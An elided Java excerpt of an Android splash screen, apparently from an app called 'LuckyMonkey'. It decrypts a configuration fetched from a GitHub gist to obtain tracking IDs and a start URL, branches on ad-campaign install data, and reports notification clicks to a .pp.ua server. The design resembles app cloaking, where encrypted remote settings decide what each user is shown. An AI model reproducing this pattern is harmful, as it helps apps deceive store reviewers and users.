...
public class SplashActivity extends AppCompatActivity {
    ...
    private final String seedWith16Chars = new String(keyValue);
    ...
    protected void onCreate(Bundle savedInstanceState) {
        ...
        Request request = new Request.Builder()
                .url("https://gist.githubusercontent.com/mayb1/70c559bb0349d76b053eda0690bbdf84/raw/LuckyMonkey")
                .build();
        ...
        client.newCall(request).enqueue(new Callback() {
            ...
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                ...
                try {
                    String decryptData = decrypt(serverAnswer);
                    JSONObject json = new JSONObject(decryptData);

                    APPSFLYER_ID = json.getString("APPSFLYER_ID");
                    ONESIGNAL_APP_ID = json.getString("ONESIGNAL_APP_ID");
                    START_URL = json.getString("START_URL");
        ...
        AsyncTask.execute(() -> {
            ...
            AppsFlyerLib.getInstance().init(APPSFLYER_ID, new AppsFlyerConversionListener() {
                ...
                public void onConversionDataSuccess(Map<String, Object> conversionDataMap) {
                    campaign = String.valueOf(conversionDataMap.get("campaign"));
                    loadLogic(campaign);
                }
    ...
    private void loadLogic(String campaign){
                            ...
                            public void onInstallReferrerSetupFinished(int responseCode) {
                                switch (responseCode) {
                                    case InstallReferrerClient.InstallReferrerResponse.OK:
                                        ...
                                        } catch (RemoteException | JSONException | InterruptedException e) {
                                            e.printStackTrace();
                                        }
                                        break;
    ...
    private void setOnesignal(String advertId){
        ...
        OneSignal.setNotificationOpenedHandler(osNotificationOpenedResult -> {
            ...
            Request signalRequest = new Request.Builder()
                    .url("https://tb-int-site.pp.ua/os/click")
                    .post(body)
                    .build();
